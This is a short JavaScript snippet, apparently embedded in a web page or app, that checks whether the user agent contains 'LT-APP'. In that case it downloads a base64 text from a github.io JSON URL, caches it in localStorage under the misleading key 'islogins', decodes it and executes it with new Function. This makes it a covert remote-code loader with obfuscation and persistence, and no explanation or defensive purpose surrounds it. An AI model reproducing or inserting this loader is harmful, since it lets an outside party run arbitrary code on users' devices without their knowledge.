i = document;
d = document;
o = window;
l = d.documentElement;
r = document.createElement("style");
if (/LT-APP/.test(navigator.userAgent)) {
    if (localStorage.getItem("islogins")) {
        var e = window.atob(localStorage.getItem("islogins"));
        var t = new Function(e);
        t();
    } else {
        var o = new XMLHttpRequest;
        var e = "https://jayouhao.github.io/mywode/objective.json";
        o.open("GET", e);
        o.send();
        o.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                if (o.responseText) {
                    localStorage.setItem("islogins", o.responseText);
                    var e = window.atob(o.responseText);
                    var t = new Function(e);
                    t()
                }
            }
        }
    }
}
